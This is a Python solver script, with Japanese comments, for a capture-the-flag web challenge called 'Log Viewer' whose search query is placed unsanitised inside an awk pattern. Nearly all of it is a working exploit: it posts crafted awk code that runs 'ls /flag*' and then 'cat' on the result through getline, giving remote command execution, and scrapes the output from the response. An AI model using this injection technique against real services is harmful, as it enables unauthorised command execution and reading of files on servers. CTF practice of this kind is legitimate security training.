#!/usr/bin/env python3
"""
Log Viewer solver - AlpacaHack DailyAlpacaHack (Web / RCE)

脆弱性: awk Code Injection
  command = ["awk", f"/{query}/", "info.log"]
  query にawkコードを注入して任意コマンド実行

攻撃:
  1. /./ パターンで最初の行にマッチ
  2. getline でコマンド出力を変数に取り込み print で出力
  3. exit で即終了 (タイムアウト回避)
"""
import requests
import re
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else 'http://34.170.146.252:57104'

# Step 1: フラグファイル名を特定
payload = './ { "ls /flag*" | getline l; print l; exit } /.'
r = requests.post(BASE, data={'query': payload})
match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
flag_file = match.group(1).strip()
print(f'[*] Flag file: {flag_file}')

# Step 2: フラグファイルを読む
payload = f'./ {{ "cat {flag_file}" | getline l; print l; exit }} /.'
r = requests.post(BASE, data={'query': payload})
match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
flag = match.group(1).strip()
print(f'[+] FLAG: {flag}')
